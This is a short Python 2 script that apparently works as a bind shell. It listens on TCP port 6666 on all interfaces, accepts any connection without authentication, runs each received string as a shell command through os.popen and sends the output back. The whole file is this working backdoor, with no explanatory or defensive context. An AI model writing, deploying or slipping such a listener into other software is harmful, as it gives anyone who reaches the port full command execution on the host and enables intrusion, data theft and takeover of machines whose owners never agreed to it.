# coding:utf-8
from socket import *
from os import *
from threading import Thread


def ThreadHandle(sock):
	cmd = sock.recv(1024)
	if cmd == 'exit':
		exit()
	result = popen(cmd).read()
	sock.send(result)

s = socket(AF_INET,SOCK_STREAM)
s.bind(('',6666))
s.listen(1)
while True:
	sock,addr = s.accept()
	print 'Connected by ',addr
	t = Thread(target=ThreadHandle,args=(sock,))
	t.start()
		
